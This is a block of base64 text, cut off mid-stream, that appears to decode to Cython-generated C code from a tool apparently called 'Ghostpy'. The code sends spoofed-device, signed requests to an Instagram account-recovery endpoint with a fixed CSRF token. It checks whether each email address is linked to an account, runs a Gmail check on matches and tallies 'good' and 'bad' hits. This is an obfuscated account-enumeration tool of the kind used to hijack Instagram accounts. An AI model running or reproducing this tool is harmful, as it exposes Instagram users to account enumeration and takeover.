EsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCAyMjQsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dob3N0Y29uZik7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDIyNiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRGljdF9HZXRJdGVtKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NvbnRlbnRfdHlwZV9oZWFkZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAyMjYsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR2hvc3Rjb25mKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMjI2LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9EaWN0X0dldEl0ZW0oX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY29udGVudF90eXBlX2Zvcm0pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAyMjYsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X3RfMSwgX19weXhfdF8yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDIyNCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgX19weXhfdl9oZWFkZXJzID0gKChQeU9iamVjdCopX19weXhfdF83KTsKICBfX3B5eF90XzcgPSAwOwoKICAKICBfX3B5eF90XzcgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoMik7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDIyOSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HaG9zdGNvbmYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAyMjksIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0RpY3RfR2V0SXRlbShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zaWduZWRfYm9keSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDIyOSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CgogIAogIF9fcHl4X3RfMyA9IE5VTEw7CiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9qc29uKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMjMxLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2R1bXBzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMjMxLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKCiAgCiAgX19weXhfdF82ID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAyMzIsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jc3JmdG9rZW4sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfOXkzTjVrTHF6aWFsUUE3ejk2QU1peUFLTE1CV3BxVmopIDwgKDApKSBfX1BZWF9FUlIoMCwgMjMyLCBfX3B5eF9MMV9lcnJvcikKCiAgCiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2FkaWQsIF9fcHl4X3ZfdXVpKSA8ICgwKSkgX19QWVhfRVJSKDAsIDIzMiwgX19weXhfTDFfZXJyb3IpCgogIAogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9ndWlkLCBfX3B5eF92X3V1aSkgPCAoMCkpIF9fUFlYX0VSUigwLCAyMzIsIF9fcHl4X0wxX2Vycm9yKQoKICAKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZGV2aWNlX2lkLCBfX3B5eF92X2RldmljZV9pZCkgPCAoMCkpIF9fUFlYX0VSUigwLCAyMzIsIF9fcHl4X0wxX2Vycm9yKQoKICAKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcXVlcnksIF9fcHl4X3ZfZW1haWwpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjMyLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF90XzQgPSAxOwogICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF81KSkpIHsKICAgIF9fcHl4X3RfMyA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNSk7CiAgICBhc3NlcnQoX19weXhfdF8zKTsKICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF81KTsKICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzMpOwogICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNSwgX19weXhfX2Z1bmN0aW9uKTsKICAgIF9fcHl4X3RfNCA9IDA7CiAgfQogICNlbmRpZgogIHsKICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzMsIF9fcHl4X3RfNn07CiAgICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNCwgKDItX19weXhfdF80KSB8IChfX3B5eF90XzQqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMjMxLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIH0KCiAgCiAgX19weXhfdF81ID0gUHlOdW1iZXJfQWRkKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMGQwNjdjMmY4NmNhYzJjMTdkNjU1NjMxYzljZWMyNDAsIF9fcHl4X3RfMik7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDIzMCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfdF8xLCBfX3B5eF90XzUpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjI5LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKCiAgCiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HaG9zdGNvbmYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAyMzksIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0RpY3RfR2V0SXRlbShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pZ19zaWdfa2V5X3ZlcnNpb24pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAyMzksIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV80KSA8ICgwKSkgX19QWVhfRVJSKDAsIDIyOSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgX19weXhfdl9kYXRhID0gKChQeU9iamVjdCopX19weXhfdF83KTsKICBfX3B5eF90XzcgPSAwOwoKICAKICBfX3B5eF90XzEgPSBOVUxMOwogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2Vzc2lvbik7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDI0MSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgX19weXhfdF8yID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9wb3N0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMjQxLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKCiAgCiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HaG9zdGNvbmYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAyNDIsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0RpY3RfR2V0SXRlbShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pbnN0YWdyYW1fcmVjb3ZlcnlfdXJsKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMjQyLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICBfX3B5eF90XzQgPSAxOwogICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF8yKSkpIHsKICAgIF9fcHl4X3RfMSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfMik7CiAgICBhc3NlcnQoX19weXhfdF8xKTsKICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF8yKTsKICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzEpOwogICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfMiwgX19weXhfX2Z1bmN0aW9uKTsKICAgIF9fcHl4X3RfNCA9IDA7CiAgfQogICNlbmRpZgogIHsKICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syICsgKChDWVRIT05fVkVDVE9SQ0FMTCkgPyAyIDogMCldID0ge19fcHl4X3RfMSwgX19weXhfdF82fTsKICAgIF9fcHl4X3RfNSA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoMik7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDI0MSwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2hlYWRlcnMsIF9fcHl4X3ZfaGVhZGVycywgX19weXhfdF81LCBfX3B5eF9jYWxsYXJncysyLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDI0MSwgX19weXhfTDFfZXJyb3IpCiAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kYXRhLCBfX3B5eF92X2RhdGEsIF9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrMiwgMSkgPCAoMCkpIF9fUFlYX0VSUigwLCAyNDEsIF9fcHl4X0wxX2Vycm9yKQogICAgX19weXhfdF83ID0gX19QeXhfT2JqZWN0X1ZlY3RvcmNhbGxfQ2FsbEZyb21CdWlsZGVyKF9fcHl4X3RfMiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF80LCAoMi1fX3B5eF90XzQpIHwgKF9fcHl4X3RfNCpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpLCBfX3B5eF90XzUpOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMjQxLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogIH0KICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RleHQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAyNDIsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogIF9fcHl4X3ZfcmVzcG9uc2UgPSBfX3B5eF90XzI7CiAgX19weXhfdF8yID0gMDsKCiAgCiAgX19weXhfdF8xMSA9IChfX1B5eF9QeVNlcXVlbmNlX0NvbnRhaW5zVEYoX19weXhfdl9lbWFpbCwgX19weXhfdl9yZXNwb25zZSwgUHlfRVEpKTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzExIDwgMCkpKSBfX1BZWF9FUlIoMCwgMjQzLCBfX3B5eF9MMV9lcnJvcikKICBpZiAoX19weXhfdF8xMSkgewoKICAgIAogICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HaG9zdGNvbmYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAyNDQsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9EaWN0X0dldEl0ZW0oX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR2hvc3RweSk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDI0NCwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgX19weXhfdF8xMSA9IChfX1B5eF9QeVNlcXVlbmNlX0NvbnRhaW5zVEYoX19weXhfdF83LCBfX3B5eF92X2VtYWlsLCBQeV9FUSkpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfMTEgPCAwKSkpIF9fUFlYX0VSUigwLCAyNDQsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICBpZiAoX19weXhfdF8xMSkgewoKICAgICAgCiAgICAgIF9fcHl4X3RfMiA9IE5VTEw7CiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2hlY2tfZ21haWwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAyNDUsIF9fcHl4X0wxX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgX19weXhfdF80ID0gMTsKICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF81KSkpIHsKICAgICAgICBfX3B5eF90XzIgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzUpOwogICAgICAgIGFzc2VydChfX3B5eF90XzIpOwogICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF81KTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8yKTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNSwgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICBfX3B5eF90XzQgPSAwOwogICAgICB9CiAgICAgICNlbmRpZgogICAgICB7CiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMiwgX19weXhfdl9lbWFpbH07CiAgICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF81LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzQsICgyLV9fcHl4X3RfNCkgfCAoX19weXhfdF80Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAyNDUsIF9fcHl4X0wxX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICB9CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwoKICAgICAgCiAgICB9CgogICAgCiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dvb2RfaWcpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAyNDYsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICBfX3B5eF90XzUgPSBfX1B5eF9QeUxvbmdfQWRkT2JqQyhfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xLCAxLCAxLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMjQ2LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dvb2RfaWcsIF9fcHl4X3RfNSkgPCAoMCkpIF9fUFlYX0VSUigwLCAyNDYsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CgogICAgCiAgICBfX3B5eF90XzcgPSBOVUxMOwogICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV91cGRhdGVfc3RhdHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAyNDcsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgICBfX3B5eF90XzQgPSAxOwogICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMikpKSB7CiAgICAgIF9fcHl4X3RfNyA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfMik7CiAgICAgIGFzc2VydChfX3B5eF90XzcpOwogICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfMik7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzcpOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTsKICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzIsIF9fcHl4X19mdW5jdGlvbik7CiAgICAgIF9fcHl4X3RfNCA9IDA7CiAgICB9CiAgICAjZW5kaWYKICAgIHsKICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNywgTlVMTH07CiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF80LCAoMS1fX3B5eF90XzQpIHwgKF9fcHl4X3RfNCpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMjQ3LCBfX3B5eF9MMV9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICB9CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKCiAgICAKICAgIGdvdG8gX19weXhfTDM7CiAgfQoKICAKICAgewogICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9iYWRfaW5zdGEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAyNDksIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICBfX3B5eF90XzIgPSBfX1B5eF9QeUxvbmdfQWRkT2JqQyhfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xLCAxLCAxLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMjQ5LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2JhZF9pbnN0YSwgX19weXhfdF8yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDI0OSwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKCiAgICAKICAgIF9fcHl4X3RfNSA9IE5VTEw7CiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3VwZGF0ZV9zdGF0cyk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDI1MCwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgIF9fcHl4X3RfNCA9IDE7CiAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF83KSkpIHsKICAgICAgX19weXhfdF81ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF83KTsKICAgICAgYXNzZXJ0KF9fcHl4X3RfNSk7CiAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF83KTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNywgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgX19weXhfdF80ID0gMDsKICAgIH0KICAgICNlbmRpZgogICAgewogICAgI